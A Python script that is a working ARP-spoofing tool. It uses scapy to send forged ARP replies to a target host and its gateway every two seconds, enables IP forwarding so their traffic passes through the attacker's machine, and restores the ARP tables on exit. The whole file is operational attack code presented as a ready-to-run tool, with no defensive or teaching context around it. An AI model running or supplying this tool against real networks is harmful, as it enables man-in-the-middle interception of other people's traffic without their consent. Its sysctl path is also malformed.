#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import subprocess
import optparse

def print_motd():
    print("""
 _     _ _______ _______ _     _
 |_____| |_____| |______ |_____|
 |     | |     | ______| |     |                               
""")

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target",dest="target_ip",help="specify the target IP to spoof")
    parser.add_option("-g","--gateway",dest="gateway_ip",help="specify the gateway/router IP to spoof")
    options = parser.parse_args()[0]
    if not options.target_ip:
        print_motd()
        parser.error("[-]Please specify target IP Address. Type option -h / --help for help")
    elif not options.gateway_ip:
        print_motd()
        parser.error("[-]Please specify Gateway/Router IP Address. Type option -h / --help for help")
    else:
        return options

def getmac(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=getmac(target_ip), psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(dest_ip,src_ip):
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=getmac(dest_ip), psrc=src_ip, hwsrc=getmac(src_ip))
    scapy.send(packet,count=4,verbose=False)

send_packet_counter=0

options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip


try:
    print_motd()
    port_forwarding = subprocess.call(["sysctl","-w","/net/ipv4/ip_forward=1"])
    print("[+]setting Port forwarding")
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        send_packet_counter=send_packet_counter+2
        print("\r[+]Packet Send : " + str(send_packet_counter)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+]Detected Ctrl + C .. Restoring ARP Tables ....Please Wait!!!!")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)
    port_forwarding = subprocess.call(["sysctl", "-w", "/net/ipv4/ip_forward=0"])
    print("[+]Disabling Port forwarding")
    print("[+]Restored ARP Table Successfully")
